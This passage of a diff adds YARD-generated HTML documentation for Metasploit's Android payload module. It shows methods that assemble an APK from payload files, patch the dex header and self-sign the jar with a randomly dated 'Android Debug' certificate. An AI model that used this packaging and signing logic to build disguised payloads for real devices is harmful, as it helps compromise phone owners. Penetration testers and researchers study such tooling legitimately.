+    <span class='lbracket'>[</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>resources.arsc</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span>
+  <span class='rbracket'>]</span>
+  <span class='id identifier rubyid_jar'>jar</span><span class='period'>.</span><span class='id identifier rubyid_add_files'>add_files</span><span class='lparen'>(</span><span class='id identifier rubyid_files'>files</span><span class='comma'>,</span> <span class='const'>MetasploitPayloads</span><span class='period'>.</span><span class='id identifier rubyid_path'>path</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>android</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>apk</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_jar'>jar</span><span class='period'>.</span><span class='id identifier rubyid_add_file'>add_file</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>classes.dex</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_fix_dex_header'>fix_dex_header</span><span class='lparen'>(</span><span class='id identifier rubyid_classes'>classes</span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_jar'>jar</span><span class='period'>.</span><span class='id identifier rubyid_build_manifest'>build_manifest</span>
+
+  <span class='id identifier rubyid_sign_jar'>sign_jar</span><span class='lparen'>(</span><span class='id identifier rubyid_jar'>jar</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_jar'>jar</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_stage-instance_method">
+  
+    #<strong>generate_stage</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>We could compile the .class files with dx here</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+26
+27
+28</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 26</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_stage'>generate_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="java_string-instance_method">
+  
+    #<strong>java_string</strong>(str)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+41
+42
+43</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 41</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_java_string'>java_string</span><span class='lparen'>(</span><span class='id identifier rubyid_str'>str</span><span class='rparen'>)</span>
+  <span class='lbracket'>[</span><span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>N</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='id identifier rubyid_str'>str</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="sign_jar-instance_method">
+  
+    #<strong>sign_jar</strong>(jar)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 68</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_sign_jar'>sign_jar</span><span class='lparen'>(</span><span class='id identifier rubyid_jar'>jar</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_x509_name'>x509_name</span> <span class='op'>=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>X509</span><span class='op'>::</span><span class='const'>Name</span><span class='period'>.</span><span class='id identifier rubyid_parse'>parse</span><span class='lparen'>(</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>C=US/O=Android/CN=Android Debug</span><span class='tstring_end'>&quot;</span></span>
+  <span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_signing_key'>signing_key</span>
+
+  <span class='id identifier rubyid_cert'>cert</span> <span class='op'>=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>X509</span><span class='op'>::</span><span class='const'>Certificate</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_version'>version</span> <span class='op'>=</span> <span class='int'>2</span>
+  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_serial'>serial</span> <span class='op'>=</span> <span class='int'>1</span>
+  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_subject'>subject</span> <span class='op'>=</span> <span class='id identifier rubyid_x509_name'>x509_name</span>
+  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_issuer'>issuer</span> <span class='op'>=</span> <span class='id identifier rubyid_x509_name'>x509_name</span>
+  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_public_key'>public_key</span> <span class='op'>=</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_public_key'>public_key</span>
+
+  <span class='comment'># Some time within the last 3 years
+</span>  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_not_before'>not_before</span> <span class='op'>=</span> <span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span> <span class='op'>-</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>3600</span> <span class='op'>*</span> <span class='int'>24</span> <span class='op'>*</span> <span class='int'>365</span> <span class='op'>*</span> <span class='int'>3</span><span class='rparen'>)</span>
+
+  <span class='comment'># From http://developer.android.com/tools/publishing/app-signing.html
+</span>  <span class='comment'># &quot;&quot;&quot;
+</span>  <span class='comment'># A validity period of more than 25 years is recommended.
+</span>  <span class='comment'>#
+</span>  <span class='comment'># If you plan to publish your application(s) on Google Play, note
+</span>  <span class='comment'># that a validity period ending after 22 October 2033 is a
+</span>  <span class='comment'># requirement. You cannot upload an application if it is signed
+</span>  <span class='comment'># with a key whose validity expires before that date.
+</span>  <span class='comment'># &quot;&quot;&quot;
+</span>  <span class='comment'>#
+</span>  <span class='comment'># 32-bit Ruby (and 64-bit Ruby on Windows) cannot deal with
+</span>  <span class='comment'># certificate not_after times later than Jan 1st 2038, since long is 32-bit.
+</span>  <span class='comment'># Set not_after to a random time 2~ years before the first bad date.
+</span>  <span class='comment'>#
+</span>  <span class='comment'># FIXME: this will break again randomly starting in late 2033, hopefully
+</span>  <span class='comment'># all 32-bit systems will be dead by then...
+</span>  <span class='comment'>#
+</span>  <span class='comment'># The timestamp 0x78045d81 equates to 2033-10-22 00:00:01 UTC
+</span>  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_not_after'>not_after</span> <span class='op'>=</span> <span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_at'>at</span><span class='lparen'>(</span><span class='int'>0x78045d81</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>0x7fffffff</span> <span class='op'>-</span> <span class='int'>0x78045d81</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+  <span class='comment'># If this line is left out, signature verification fails on OSX.
+</span>  <span class='id identifier rubyid_cert'>cert</span><span class='period'>.</span><span class='id identifier rubyid_sign'>sign</span><span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='comma'>,</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>Digest</span><span class='op'>::</span><span class='const'>SHA1</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_jar'>jar</span><span class='period'>.</span><span class='id identifier rubyid_sign'>sign</span><span class='lparen'>(</span><span class='id identifier rubyid_key'>key</span><span class='comma'>,</span> <span class='id identifier rubyid_cert'>cert</span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='id identifier rubyid_cert'>cert</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="signing_key-instance_method">
+  
+    #<strong>signing_key</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+8
+9
+10</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/android.rb', line 8</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_signing_key'>signing_key</span>
+  <span class='cvar'>@@signing_key</span> <span class='op'>||=</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>PKey</span><span class='op'>::</span><span class='const'>RSA</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='int'>2048</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:30:24 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
